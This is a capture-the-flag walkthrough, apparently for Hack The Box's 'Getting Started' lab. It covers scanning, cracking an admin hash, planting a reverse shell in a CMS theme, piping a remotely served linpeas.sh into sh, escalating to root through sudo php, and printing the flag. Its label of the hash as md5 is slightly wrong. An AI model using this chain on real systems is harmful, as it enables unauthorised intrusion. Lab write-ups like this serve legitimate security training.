##   Knowledge Check

Tips

Methodology
- Enumeration Scanning
- Exploitation
- Privilege Escalation 

## Steps
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Enumeration/Scanning with Nmap - perform a quick scan for open ports followed by a full port scan

Web Footprinting - check any identified web ports for running web applications, and any hidden files/directories. Some useful tools for this phase include whatweb and Gobuster

If you identify the website URL, you can add it to your '/etc/hosts' file with the IP you get in the question below to load it normally, though this is unnecessary.

After identifying the technologies in use, use a tool such as Searchsploit to find public exploits or search on Google for manual exploitation techniques

After gaining an initial foothold, use the Python3 pty trick to upgrade to a pseudo TTY

Perform manual and automated enumeration of the file system, looking for misconfigurations, services with known vulnerabilities, and sensitive data in cleartext such as credentials

Organize this data offline to determine the various ways to escalate privileges to root on this target

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
1. sudo -sV -sC -O --min-rate=1000 --script=http-enum --top-ports=5000 -o nmapscan -vv

2. gobuster dir -u http://10.129.121.73 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -o directories

\\ found /admin/, /backups/, /data/, /plugins/, /robots.txt/, index.html 

http://gettingstarted.htb/data/users/admin.xml -> admin:d033e22ae348aeb5660fc2140aec35850c4da997 | decode it as md5 -> admin:admin

3. login with admin:admin under this path http://gettingstarted.htb/admin/

4.  found /theme/ directory and u can edit the theme from the admin panel 
http://gettingstarted.htb/admin/theme-edit.php | and write a reverse shell on the theme [ pentest monkey ]

after editing the theme visit the uploaded theme under http://gettingstarted.htb/theme/Innovation/template.php and open a listener nc -nvlp 9001


5. got a reverse shell 
cd /home
cd mrb3n 
cat user.txt

6. privilege escalation
open a python3 local server on attacker machine
python3 -m http.server 8000 and download linpeas.sh on it

download linpeas on target machine
curl http://LOCAL_IP:8000/linpeas.sh | sh

after downloading linpeas.sh and run sudo -l found that user can run all commands under the /usr/bin/php
User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
    
 so go to https://gtfobins.github.io/gtfobins/php/#sudo


and enter these commands on target machine 

CMD="/bin/sh"
sudo php -r "system('$CMD');"

whoami -> root 
cd /root
cat root.txt
flag: f1fba6e9f71efb2630e6e34da6387842
